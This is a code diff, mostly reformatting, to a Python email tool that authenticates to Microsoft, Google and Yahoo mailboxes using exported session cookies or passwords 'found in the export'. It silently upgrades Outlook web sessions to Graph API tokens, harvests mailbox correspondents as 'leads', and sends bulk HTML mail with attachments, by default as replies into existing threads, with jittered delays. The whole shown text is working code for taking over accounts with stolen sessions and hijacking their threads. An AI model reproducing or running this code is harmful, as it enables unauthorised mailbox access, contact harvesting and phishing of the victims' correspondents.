                 # Store the session and use it directly for IMAP/EWS operations.
-                self._s["email"]        = email_addr
-                self._s["provider"]     = prov_type
-                self._s["owa_session"]  = _owa_session_for_imap if "_owa_session_for_imap" in dir() else ests_session
-                self._s["auth_method"]  = "owa_session"
-                return {"ok": True, "email": email_addr, "method": "owa_session",
-                        "message": "Authenticated via OWA session cookies (no Bearer token extracted)"}
+                self._s["email"] = email_addr
+                self._s["provider"] = prov_type
+                self._s["owa_session"] = (
+                    _owa_session_for_imap
+                    if "_owa_session_for_imap" in dir()
+                    else ests_session
+                )
+                self._s["auth_method"] = "owa_session"
+                return {
+                    "ok": True,
+                    "email": email_addr,
+                    "method": "owa_session",
+                    "message": "Authenticated via OWA session cookies (no Bearer token extracted)",
+                }
 
         # ── 4b: Google / Gmail / Google Workspace ─────────────────
         if is_google or prov_type == "unknown":
             session = _req.Session()
             google_domains = [
-                ".google.com", ".gmail.com", ".accounts.google.com",
-                "mail.google.com", ".googleusercontent.com",
+                ".google.com",
+                ".gmail.com",
+                ".accounts.google.com",
+                "mail.google.com",
+                ".googleusercontent.com",
             ]
             for name, value in cookie_dict.items():
                 for domain in google_domains:
                     session.cookies.set(name, value, domain=domain)
 
-            google_auth_cookies = ["SID", "SSID", "HSID", "APISID", "SAPISID",
-                                   "__Secure-1PSID", "__Secure-3PSID", "ACCOUNT_CHOOSER"]
+            google_auth_cookies = [
+                "SID",
+                "SSID",
+                "HSID",
+                "APISID",
+                "SAPISID",
+                "__Secure-1PSID",
+                "__Secure-3PSID",
+                "ACCOUNT_CHOOSER",
+            ]
             found_google = [c for c in google_auth_cookies if c in cookie_dict]
 
             if found_google:
@@ -3326,8 +4086,10 @@ class B2BSession:
                     # Try Gmail API userinfo with session cookies
                     r = session.get(
                         "https://gmail.googleapis.com/gmail/v1/users/me/profile",
-                        headers={"Accept": "application/json",
-                                 "User-Agent": "Mozilla/5.0"},
+                        headers={
+                            "Accept": "application/json",
+                            "User-Agent": "Mozilla/5.0",
+                        },
                         timeout=12,
                     )
                     if r.ok:
@@ -3336,11 +4098,11 @@ class B2BSession:
                             self._s["cookie_session"] = session
                             self._s["email"] = info["emailAddress"]
                             return {
-                                "ok":           True,
+                                "ok": True,
                                 "display_name": info["emailAddress"],
-                                "method":       "google_cookie_session",
-                                "inbox_count":  info.get("messagesTotal", 0),
-                                "note":         "Authenticated via Google session cookies",
+                                "method": "google_cookie_session",
+                                "inbox_count": info.get("messagesTotal", 0),
+                                "note": "Authenticated via Google session cookies",
                             }
                 except Exception as e:
                     errors.append(f"Google session: {e}")
@@ -3358,11 +4120,15 @@ class B2BSession:
                 if any(c in cookie_dict for c in yahoo_auth):
                     try:
                         import re as _re
+
                         r = session.get(
                             "https://mail.yahoo.com/",
-                            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                                     "Accept": "text/html"},
-                            timeout=15, allow_redirects=True,
+                            headers={
+                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                                "Accept": "text/html",
+                            },
+                            timeout=15,
+                            allow_redirects=True,
                         )
                         # Look for crumb or session token in the response
                         m = _re.search(r'"crumb"\s*:\s*"([^"]{10,})"', r.text)
@@ -3371,9 +4137,9 @@ class B2BSession:
                             self._s["cookie_session"] = session
                             self._s["email"] = email_addr
                             return {
-                                "ok":     True,
+                                "ok": True,
                                 "method": "yahoo_cookie_session",
-                                "note":   "Authenticated via Yahoo session cookies",
+                                "note": "Authenticated via Yahoo session cookies",
                             }
                     except Exception as e:
                         errors.append(f"Yahoo session: {e}")
@@ -3387,9 +4153,9 @@ class B2BSession:
                 ok, err = self.login_password(login_user, cred_pass)
                 if ok:
                     return {
-                        "ok":     True,
+                        "ok": True,
                         "method": "password_from_export",
-                        "note":   (
+                        "note": (
                             f"Session cookies did not authenticate directly — "
                             f"used username/password found in the export for {prov.get('name', prov_type)} login"
                         ),
@@ -3406,7 +4172,7 @@ class B2BSession:
         if not cookie_dict and cred_pass:
             # Had credentials but they failed
             return {
-                "ok":    False,
+                "ok": False,
                 "error": (
                     f"Found username/password in the export but authentication failed for {prov_name}. "
                     f"Check your credentials or use Device Code / App Password flow. "
@@ -3415,20 +4181,24 @@ class B2BSession:
             }
 
         hint = ""
-        if is_ms and not any(c in cookie_dict for c in [
-                "ESTSAUTH", "ESTSAUTHPERSISTENT", "OIDCAuth", "sccauth"]):
+        if is_ms and not any(
+            c in cookie_dict
+            for c in ["ESTSAUTH", "ESTSAUTHPERSISTENT", "OIDCAuth", "sccauth"]
+        ):
             hint = (
                 " For Microsoft/Office365 cookie auth, export cookies while you are "
                 "already logged in on outlook.office365.com — not on the login page."
             )
-        elif is_google and not any(c in cookie_dict for c in ["SID", "SSID", "__Secure-1PSID"]):
+        elif is_google and not any(
+            c in cookie_dict for c in ["SID", "SSID", "__Secure-1PSID"]
+        ):
             hint = (
                 " For Gmail cookie auth, export cookies while logged in on mail.google.com. "
                 "Gmail requires an App Password for IMAP — Device Code is more reliable."
             )
 
         return {
-            "ok":    False,
+            "ok": False,
             "error": (
                 f"Could not authenticate via cookies for {prov_name}.{hint} "
                 f"Parsed {len(cookie_dict)} cookie(s): {got_keys}. "
@@ -3440,8 +4210,7 @@ class B2BSession:
 
     # ── Login: Method 3 — pre-obtained token / cookies ─────────
 
-    def login_token(self, email_addr: str, token: str,
-                    expires_in: int = 3600) -> dict:
+    def login_token(self, email_addr: str, token: str, expires_in: int = 3600) -> dict:
         """
         Accept a pre-obtained Bearer token — e.g. extracted from
         browser cookies or another OAuth flow.
@@ -3455,12 +4224,17 @@ class B2BSession:
         self._s["email"] = email_addr
         result = login_token(email_addr, token, self._s, expires_in)
         if result.get("ok"):
-            self._s["ms_token"]         = self._s.get("ms_token") or token
+            self._s["ms_token"] = self._s.get("ms_token") or token
             self._s["ms_token_expires"] = self._s.get("ms_token_expires", 0.0)
         return result
 
-    def login_refresh_token(self, email_addr: str, refresh_token: str,
-                            client_id: str = None, tenant: str = "common") -> dict:
+    def login_refresh_token(
+        self,
+        email_addr: str,
+        refresh_token: str,
+        client_id: str = None,
+        tenant: str = "common",
+    ) -> dict:
         """
         Exchange a refresh token for an access token and authenticate.
 
@@ -3490,8 +4264,14 @@ class B2BSession:
         for _name, cid in clients:
             at, rt, exp, err = exchange_refresh_token(refresh_token, cid, tenant)
             if at:
-                log.info("[B2B] refresh token exchange OK via client=%s for %s", _name, email_addr)
-                result = login_token(email_addr, at, self._s, max(60, int(exp - time.time())))
+                log.info(
+                    "[B2B] refresh token exchange OK via client=%s for %s",
+                    _name,
+                    email_addr,
+                )
+                result = login_token(
+                    email_addr, at, self._s, max(60, int(exp - time.time()))
+                )
                 if result.get("ok"):
                     if rt:
                         self._s["ms_refresh_token"] = rt
@@ -3504,7 +4284,9 @@ class B2BSession:
         if _HAS_MSAL:
             at, rt, exp, err = _ms_refresh_token(refresh_token, email_addr)
             if at:
-                result = login_token(email_addr, at, self._s, max(60, int(exp - time.time())))
+                result = login_token(
+                    email_addr, at, self._s, max(60, int(exp - time.time()))
+                )
                 if result.get("ok") and rt:
                     self._s["ms_refresh_token"] = rt
                 return result
@@ -3529,55 +4311,71 @@ class B2BSession:
 
     def extract(
         self,
-        folders:        list,
-        limit:          Optional[int] = None,
-        filter_generic: bool          = True,
-        only_domains:   Optional[set] = None,
-        block_domains:  Optional[set] = None,
-        subject_kw:     Optional[str] = None,
-        date_after:     Optional[str] = None,
-        days_back:      int           = 90,
-        domain_allow:   list          = None,
-        domain_block:   list          = None,
-        subject_filter: list          = None,
+        folders: list,
+        limit: Optional[int] = None,
+        filter_generic: bool = True,
+        only_domains: Optional[set] = None,
+        block_domains: Optional[set] = None,
+        subject_kw: Optional[str] = None,
+        date_after: Optional[str] = None,
+        days_back: int = 90,
+        domain_allow: list = None,
+        domain_block: list = None,
+        subject_filter: list = None,
     ) -> Generator:
         """
         Generator — streams extraction events, saves raw_results internally.
         folders: list of folder IDs/names. Pass ["Inbox"] for just inbox.
         """
         # Merge domain_allow/block aliases
-        only_domains  = set(only_domains or domain_allow or []) or None
+        only_domains = set(only_domains or domain_allow or []) or None
         block_domains = set(block_domains or domain_block or []) or None
 
         # Compute date_after from days_back if not explicitly given
         if not date_after and days_back:
             import datetime as _dt
-            date_after = (_dt.datetime.utcnow() - _dt.timedelta(days=days_back)).strftime("%Y-%m-%dT00:00:00Z")
+
+            date_after = (
+                _dt.datetime.utcnow() - _dt.timedelta(days=days_back)
+            ).strftime("%Y-%m-%dT00:00:00Z")
 
         token = self._s.get("ms_token")
-        conn  = self._s.get("imap_conn")
-        owa   = self._s.get("owa_session")
+        conn = self._s.get("imap_conn")
+        owa = self._s.get("owa_session")
 
         # If we have an OWA session but no Bearer token, try to silently upgrade
         # to a Graph API token before falling back to the EWS/OWA extraction path.
         # Many tenants block EWS but allow Graph, so this avoids SESSION_AUTH_FAILED.
         if owa and not token:
-            yield {"type": "progress", "msg": "OWA session detected — attempting silent Graph token upgrade…"}
+            yield {
+                "type": "progress",
+                "msg": "OWA session detected — attempting silent Graph token upgrade…",
+            }
             _upgrade_token = None
             _UA_up = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             for _path in ["/owa/auth/oauthtoken", "/owa/0/oauthtoken"]:
                 try:
                     _tr = owa.post(
                         f"https://outlook.office365.com{_path}",
-                        data={"resource": "https://graph.microsoft.com", "grant_type": "implicit"},
-                        headers={"User-Agent": _UA_up, "Origin": "https://outlook.office365.com",
-                                 "X-Requested-With": "XMLHttpRequest"},
+                        data={
+                            "resource": "https://graph.microsoft.com",
+                            "grant_type": "implicit",
+                        },
+                        headers={
+                            "User-Agent": _UA_up,
+                            "Origin": "https://outlook.office365.com",
+                            "X-Requested-With": "XMLHttpRequest",
+                        },
                         timeout=12,
                     )
                     if _tr.ok:
                         _j = _tr.json()
-                        _upgrade_token = (_j.get("access_token") or _j.get("token")
-                                          or _j.get("Token") or "")
+                        _upgrade_token = (
+                            _j.get("access_token")
+                            or _j.get("token")
+                            or _j.get("Token")
+                            or ""
+                        )
                         if _upgrade_token:
                             break
                 except Exception:
@@ -3588,8 +4386,11 @@ class B2BSession:
                     _tr2 = owa.post(
                         "https://outlook.office365.com/owa/service.svc?action=GetAccessTokenforResource",
                         json={"resource": "https://graph.microsoft.com"},
-                        headers={"User-Agent": _UA_up, "Content-Type": "application/json",
-                                 "Origin": "https://outlook.office365.com"},
+                        headers={
+                            "User-Agent": _UA_up,
+                            "Content-Type": "application/json",
+                            "Origin": "https://outlook.office365.com",
+                        },
                         timeout=12,
                     )
                     if _tr2.ok:
@@ -3599,77 +4400,101 @@ class B2BSession:
             if not _upgrade_token:
                 # OAuth2 silent auth: ESTS cookies → auth code → Graph Bearer token
                 # prompt=none causes Microsoft to silently issue a code if ESTS is valid
-                yield {"type": "progress", "msg": "Trying OAuth2 silent auth (ESTS → Graph token)…"}
+                yield {
+                    "type": "progress",
+                    "msg": "Trying OAuth2 silent auth (ESTS → Graph token)…",
+                }
                 for _cid in [cid for _, cid in MS_APPS[:3]]:
                     if _upgrade_token:
                         break
                     for _tenant in ["common", "organizations"]:
                         try:
                             import urllib.parse as _up
+
                             _silent_url = (
                                 f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/authorize"
                                 f"?client_id={_cid}"
                                 f"&response_type=code"
                                 f"&response_mode=query"
-                                f"&redirect_uri=" + _up.quote("https://login.microsoftonline.com/common/oauth2/nativeclient", safe="") +
-                                f"&scope=" + _up.quote("https://graph.microsoft.com/.default offline_access", safe="") +
-                                f"&prompt=none"
+                                f"&redirect_uri="
+                                + _up.quote(
+                                    "https://login.microsoftonline.com/common/oauth2/nativeclient",
+                                    safe="",
+                                )
+                                + "&scope="
+                                + _up.quote(
+                                    "https://graph.microsoft.com/.default offline_access",
+                                    safe="",
+                                )
+                                + "&prompt=none"
                             )
-                            _ar = owa.get(_silent_url, allow_redirects=True,
-                                          timeout=15, headers={"User-Agent": _UA_up})
-                            _code_m = re.search(r'[?&]code=([^&#]+)', _ar.url)
+                            _ar = owa.get(
+                                _silent_url,
+                                allow_redirects=True,
+                                timeout=15,
+                                headers={"User-Agent": _UA_up},
+                            )
+                            _code_m = re.search(r"[?&]code=([^&#]+)", _ar.url)
                             if _code_m:
                                 _code = _up.unquote(_code_m.group(1))
                                 _tok_r = owa.post(
                                     f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/token",
-                                    data={"grant_type": "authorization_code", "code": _code,
-                                          "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
-                                          "client_id": _cid,
-                                          "scope": "https://graph.microsoft.com/.default offline_access"},
+                                    data={
+                                        "grant_type": "authorization_code",
+                                        "code": _code,
+                                        "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
+                                        "client_id": _cid,
+                                        "scope": "https://graph.microsoft.com/.default offline_access",
+                                    },
                                     timeout=15,
                                 )
                                 if _tok_r.ok:
-                                    _upgrade_token = _tok_r.json().get("access_token", "")
+                                    _upgrade_token = _tok_r.json().get(
+                                        "access_token", ""
+                                    )
                                     if _upgrade_token:
                                         break
                         except Exception:
                             pass
             if _upgrade_token:
-                yield {"type": "progress", "msg": "✓ Upgraded OWA session to Graph API token — using Graph extraction"}
+                yield {
+                    "type": "progress",
+                    "msg": "✓ Upgraded OWA session to Graph API token — using Graph extraction",
+                }
                 self._s["ms_token"] = _upgrade_token
                 token = _upgrade_token
 
         if token:
             gen = extract_graph(
-                token          = token,
-                folder_ids     = folders,
-                limit          = limit,
-                filter_generic = filter_generic,
-                only_domains   = only_domains,
-                block_domains  = block_domains,
-                subject_kw     = subject_kw,
-                date_after     = date_after,
+                token=token,
+                folder_ids=folders,
+                limit=limit,
+                filter_generic=filter_generic,
+                only_domains=only_domains,
+                block_domains=block_domains,
+                subject_kw=subject_kw,
+                date_after=date_after,
             )
         elif owa:
             gen = extract_owa_session(
-                session        = owa,
-                folders        = folders,
-                limit          = limit or 2000,
-                filter_generic = filter_generic,
-                only_domains   = only_domains,
-                block_domains  = block_domains,
-                days_back      = days_back,
+                session=owa,
+                folders=folders,
+                limit=limit or 2000,
+                filter_generic=filter_generic,
+                only_domains=only_domains,
+                block_domains=block_domains,
+                days_back=days_back,
             )
         elif conn:
             gen = extract_imap(
-                conn           = conn,
-                folders        = folders,
-                limit          = limit,
-                filter_generic = filter_generic,
-                only_domains   = only_domains,
-                block_domains  = block_domains,
-                subject_kw     = subject_kw,
-                date_after     = date_after,
+                conn=conn,
+                folders=folders,
+                limit=limit,
+                filter_generic=filter_generic,
+                only_domains=only_domains,
+                block_domains=block_domains,
+                subject_kw=subject_kw,
+                date_after=date_after,
             )
         else:
             yield {"type": "error", "msg": "Not authenticated — call login first"}
@@ -3682,9 +4507,13 @@ class B2BSession:
                 # Convert batch results → individual lead events + done
                 # (extract_graph batches; frontend expects streaming lead + done)
                 for r in raw:
-                    yield {"type": "lead", "email": r.get("addr", ""),
-                           "name": r.get("name", ""), "date": r.get("date", ""),
-                           "subject": r.get("subject", "")}
+                    yield {
+                        "type": "lead",
+                        "email": r.get("addr", ""),
+                        "name": r.get("name", ""),
+                        "date": r.get("date", ""),
+                        "subject": r.get("subject", ""),
+                    }
                 yield {"type": "done", "total": len(raw)}
                 return
             yield event
@@ -3693,15 +4522,15 @@ class B2BSession:
 
     def sanitize(
         self,
-        filter_generic:  bool = True,
-        dedup_domain:    bool = False,
-        score_threshold: int  = 0,
+        filter_generic: bool = True,
+        dedup_domain: bool = False,
+        score_threshold: int = 0,
     ) -> list:
         leads = sanitize_leads(
-            raw_results     = self._s.get("raw_results", []),
-            filter_generic  = filter_generic,
-            dedup_domain    = dedup_domain,
-            score_threshold = score_threshold,
+            raw_results=self._s.get("raw_results", []),
+            filter_generic=filter_generic,
+            dedup_domain=dedup_domain,
+            score_threshold=score_threshold,
         )
         self._s["leads"] = leads
         return leads
@@ -3710,48 +4539,48 @@ class B2BSession:
 
     def send(
         self,
-        leads:       list,
-        html:        str,
-        subject:     str,
-        plain:       str   = "",
-        mode:        str   = "new",
-        from_name:   str   = "",
-        from_email:  str   = "",
-        attachments: list  = None,
-        delay:       float = 1.5,
-        jitter:      float = 1.0,
-        batch_size:  int   = 0,
+        leads: list,
+        html: str,
+        subject: str,
+        plain: str = "",
+        mode: str = "new",
+        from_name: str = "",
+        from_email: str = "",
+        attachments: list = None,
+        delay: float = 1.5,
+        jitter: float = 1.0,
+        batch_size: int = 0,
         batch_delay: float = 30.0,
-        max_sends:   int   = 0,
+        max_sends: int = 0,
     ) -> Generator:
         """Generator — streams send events."""
         acct = B2BAccount(
-            email            = self._s.get("email", ""),
-            provider         = self._s.get("provider") or {},
-            ms_token         = self._s.get("ms_token"),
-            ms_token_expires = float(self._s.get("ms_token_expires", 0)),
-            ms_refresh       = self._s.get("ms_refresh"),
-            imap_conn        = self._s.get("imap_conn"),
-            smtp_host        = self._s.get("smtp_host", ""),
-            smtp_port        = int(self._s.get("smtp_port", 587)),
-            smtp_user        = self._s.get("email", ""),
-            smtp_pass        = self._s.get("smtp_pass", ""),
+            email=self._s.get("email", ""),
+            provider=self._s.get("provider") or {},
+            ms_token=self._s.get("ms_token"),
+            ms_token_expires=float(self._s.get("ms_token_expires", 0)),
+            ms_refresh=self._s.get("ms_refresh"),
+            imap_conn=self._s.get("imap_conn"),
+            smtp_host=self._s.get("smtp_host", ""),
+            smtp_port=int(self._s.get("smtp_port", 587)),
+            smtp_user=self._s.get("email", ""),
+            smtp_pass=self._s.get("smtp_pass", ""),
         )
         yield from send_b2b(
-            account     = acct,
-            leads       = leads,
-            html        = html,
-            subject     = subject,
-            plain       = plain,
-            mode        = mode,
-            from_name   = from_name,
-            from_email  = from_email,
-            attachments = attachments,
-            delay       = delay,
-            jitter      = jitter,
-            batch_size  = batch_size,
-            batch_delay = batch_delay,
-            max_sends   = max_sends,
+            account=acct,
+            leads=leads,
+            html=html,
+            subject=subject,
+            plain=plain,
+            mode=mode,
+            from_name=from_name,
+            from_email=from_email,
+            attachments=attachments,
+            delay=delay,
+            jitter=jitter,
+            batch_size=batch_size,
+            batch_delay=batch_delay,
+            max_sends=max_sends,
         )
 
     # ── Reset ────────────────────────────────────────────────────
@@ -3768,21 +4597,21 @@ class B2BSession:
     # ── Status ───────────────────────────────────────────────────
 
     def status(self) -> dict:
-        prov   = self._s.get("provider") or {}
-        token  = self._s.get("ms_token")
-        conn   = self._s.get("imap_conn")
-        exp    = float(self._s.get("ms_token_expires", 0))
-        ttl    = max(0, int(exp - time.time())) if token else 0
+        prov = self._s.get("provider") or {}
+        token = self._s.get("ms_token")
+        conn = self._s.get("imap_conn")
+        exp = float(self._s.get("ms_token_expires", 0))
+        ttl = max(0, int(exp - time.time())) if token else 0
         return {
-            "authenticated":  bool(token or conn),
-            "email":          self._s.get("email", ""),
-            "provider":       prov.get("name", ""),
-            "provider_type":  prov.get("type", ""),
-            "method":         "ms_graph" if token else ("imap" if conn else "none"),
-            "token_valid":    bool(token and time.time() + 60 < exp),
-            "token_ttl_s":    ttl,
-            "raw_count":      len(self._s.get("raw_results", [])),
-            "lead_count":     len(self._s.get("leads", [])),
+            "authenticated": bool(token or conn),
+            "email": self._s.get("email", ""),
+            "provider": prov.get("name", ""),
+            "provider_type": prov.get("type", ""),
+            "method": "ms_graph" if token else ("imap" if conn else "none"),
+            "token_valid": bool(token and time.time() + 60 < exp),
+            "token_ttl_s": ttl,
+            "raw_count": len(self._s.get("raw_results", [])),
+            "lead_count": len(self._s.get("leads", [])),
         }
 
 
@@ -3796,6 +4625,7 @@ class B2BSession:
 # still imported the old names. This shim restores them so those imports
 # keep working without forcing every call site to be rewritten.
 
+
 class B2BSender(B2BSession):
     """Compatibility wrapper around B2BSession.
 
@@ -3804,9 +4634,14 @@ class B2BSender(B2BSession):
     core.campaign.process_campaign() when method == "b2b".
     """
 
-    def __init__(self, token: str = "", mailbox: str = "",
-                 refresh_token: str = "", expires_in: int = 3600,
-                 **_ignored):
+    def __init__(
+        self,
+        token: str = "",
+        mailbox: str = "",
+        refresh_token: str = "",
+        expires_in: int = 3600,
+        **_ignored,
+    ):
         super().__init__()
         if mailbox:
             self._s["email"] = mailbox
@@ -3815,59 +4650,80 @@ class B2BSender(B2BSession):
             except Exception:
                 self._s["provider"] = {"type": "unknown", "name": "Unknown"}
         if token:
-            self._s["ms_token"]         = token
+            self._s["ms_token"] = token
             self._s["ms_token_expires"] = time.time() + max(60, int(expires_in))
-            self._s["ms_refresh"]       = refresh_token or None
+            self._s["ms_refresh"] = refresh_token or None
 
     # ── Microsoft "/me" probe used by /api/b2b/connect ──────────
     def get_me(self) -> dict:
         tok = self._s.get("ms_token")
         if not tok:
             mail = self._s.get("email", "")
-            return {"displayName": mail, "mail": mail,
-                    "userPrincipalName": mail}
+            return {"displayName": mail, "mail": mail, "userPrincipalName": mail}
         try:
-            import urllib.request as _ur
+            import core.urlopen_compat as _ur
             import json as _j
+
             req = _ur.Request(
                 "https://graph.microsoft.com/v1.0/me",
-                headers={"Authorization": f"Bearer {tok}",
-                         "Accept": "application/json"},
+                headers={
+                    "Authorization": f"Bearer {tok}",
+                    "Accept": "application/json",
+                },
             )
             with _ur.urlopen(req, timeout=10) as r:
                 data = _j.loads(r.read())
-                self._s["email"] = data.get("mail") or \
-                    data.get("userPrincipalName") or self._s.get("email", "")
+                self._s["email"] = (
+                    data.get("mail")
+                    or data.get("userPrincipalName")
+                    or self._s.get("email", "")
+                )
                 return data
         except Exception as e:
             mail = self._s.get("email", "")
-            return {"displayName": mail, "mail": mail,
-                    "error": str(e)[:200]}
+            return {"displayName": mail, "mail": mail, "error": str(e)[:200]}
 
     # ── Thread digest used by /api/b2b/threads ──────────────────
-    def list_threads(self, folder: str = "Inbox", limit: int = 50,
-                     since_days: int = 30) -> list:
+    def list_threads(
+        self, folder: str = "Inbox", limit: int = 50, since_days: int = 30
+    ) -> list:
         import datetime as _dt
-        date_after = (_dt.datetime.utcnow() -
-                      _dt.timedelta(days=int(since_days or 30))) \
-            .strftime("%Y-%m-%dT00:00:00Z")
+
+        date_after = (
+            _dt.datetime.utcnow() - _dt.timedelta(days=int(since_days or 30))
+        ).strftime("%Y-%m-%dT00:00:00Z")
         out: list = []
         try:
-            for ev in self.extract(folders=[folder], limit=int(limit or 50),
-                                   filter_generic=False, date_after=date_after):
+            for ev in self.extract(
+                folders=[folder],
+                limit=int(limit or 50),
+                filter_generic=False,
+                date_after=date_after,
+            ):
                 if ev.get("type") == "extracted":
-                    out = (ev.get("results") or [])[:int(limit or 50)]
+                    out = (ev.get("results") or [])[: int(limit or 50)]
         except Exception:
             pass
         return out
 
     # ── Campaign generator used by core.campaign (method="b2b") ─
-    def run_campaign(self, threads: list, html: str, leads: list,
-                     delay_range=(3.0, 8.0), max_sends: int = 0,
-                     subject: str = "", from_name: str = "", from_email: str = "",
-                     attachments: list = None, mode: str = "reply",
-                     plain: str = "", batch_size: int = 0, batch_delay: float = 30.0):
-        delay  = (float(delay_range[0]) + float(delay_range[1])) / 2.0
+    def run_campaign(
+        self,
+        threads: list,
+        html: str,
+        leads: list,
+        delay_range=(3.0, 8.0),
+        max_sends: int = 0,
+        subject: str = "",
+        from_name: str = "",
+        from_email: str = "",
+        attachments: list = None,
+        mode: str = "reply",
+        plain: str = "",
+        batch_size: int = 0,
+        batch_delay: float = 30.0,
+    ):
+        delay = (float(delay_range[0]) + float(delay_range[1])) / 2.0
         jitter = max(0.0, (float(delay_range[1]) - float(delay_range[0])) / 2.0)
         # If we have IMAP-discovered threads with message-ids, use them as
         # the lead list in reply mode; otherwise fall back to plain leads.
@@ -3877,43 +4733,54 @@ class B2BSender(B2BSession):
                 if isinstance(L, B2BLead):
                     b2b_leads.append(L)
                 else:
-                    b2b_leads.append(B2BLead(
-                        email        = (L.get("email") if isinstance(L, dict) else str(L)) or "",
-                        name         = (L.get("name", "") if isinstance(L, dict) else ""),
-                        last_subject = (L.get("subject", "") if isinstance(L, dict) else ""),
-                        last_date    = (L.get("date", "") if isinstance(L, dict) else ""),
-                        message_id   = (L.get("message_id", "") if isinstance(L, dict) else ""),
-                        thread_ids   = [],
-                        folder       = "Inbox",
-                        score        = int(L.get("score", 0)) if isinstance(L, dict) else 0,
-                    ))
+                    b2b_leads.append(
+                        B2BLead(
+                            email=(L.get("email") if isinstance(L, dict) else str(L))
+                            or "",
+                            name=(L.get("name", "") if isinstance(L, dict) else ""),
+                            last_subject=(
+                                L.get("subject", "") if isinstance(L, dict) else ""
+                            ),
+                            last_date=(
+                                L.get("date", "") if isinstance(L, dict) else ""
+                            ),
+                            message_id=(
+                                L.get("message_id", "") if isinstance(L, dict) else ""
+                            ),
+                            thread_ids=[],
+                            folder="Inbox",
+                            score=int(L.get("score", 0)) if isinstance(L, dict) else 0,
+                        )
+                    )
         elif threads:
             for t in threads:
-                b2b_leads.append(B2BLead(
-                    email        = t.get("from_email") or t.get("email", ""),
-                    name         = t.get("from_name", ""),
-                    last_subject = t.get("subject", ""),
-                    last_date    = t.get("date", ""),
-                    message_id   = t.get("message_id", ""),
-                    thread_ids   = [t["message_id"]] if t.get("message_id") else [],
-                    folder       = t.get("folder", "Inbox"),
-                    score        = int(t.get("score", 0)),
-                ))
+                b2b_leads.append(
+                    B2BLead(
+                        email=t.get("from_email") or t.get("email", ""),
+                        name=t.get("from_name", ""),
+                        last_subject=t.get("subject", ""),
+                        last_date=t.get("date", ""),
+                        message_id=t.get("message_id", ""),
+                        thread_ids=[t["message_id"]] if t.get("message_id") else [],
+                        folder=t.get("folder", "Inbox"),
+                        score=int(t.get("score", 0)),
+                    )
+                )
         cap = int(max_sends or len(b2b_leads))
         yield from self.send(
-            leads       = b2b_leads,
-            html        = html,
-            subject     = subject,
-            plain       = plain,
-            mode        = mode,
-            from_name   = from_name,
-            from_email  = from_email,
-            attachments = attachments or [],
-            delay       = delay,
-            jitter      = jitter,
-            batch_size  = int(batch_size or 0),
-            batch_delay = float(batch_delay or 30.0),
-            max_sends   = cap,
+            leads=b2b_leads,
+            html=html,
+            subject=subject,
+            plain=plain,
+            mode=mode,
+            from_name=from_name,
+            from_email=from_email,
+            attachments=attachments or [],
+            delay=delay,
+            jitter=jitter,
+            batch_size=int(batch_size or 0),
+            batch_delay=float(batch_delay or 30.0),
+            max_sends=cap,
         )
 
 
@@ -3925,10 +4792,11 @@ def b2b_from_cfg(cfg: dict) -> "B2BSender":
     """
     cfg = cfg or {}
     return B2BSender(
-        token         = cfg.get("token") or cfg.get("accessToken")
-                       or cfg.get("access_token") or "",
-        mailbox       = cfg.get("mailbox") or cfg.get("email")
-                       or cfg.get("from_email") or "",
-        refresh_token = cfg.get("refreshToken") or cfg.get("refresh_token") or "",
-        expires_in    = int(cfg.get("expiresIn") or cfg.get("expires_in") or 3600),
+        token=cfg.get("token")
+        or cfg.get("accessToken")
+        or cfg.get("access_token")
+        or "",
+        mailbox=cfg.get("mailbox") or cfg.get("email") or cfg.get("from_email") or "",
+        refresh_token=cfg.get("refreshToken") or cfg.get("refresh_token") or "",
+        expires_in=int(cfg.get("expiresIn") or cfg.get("expires_in") or 3600),
     )
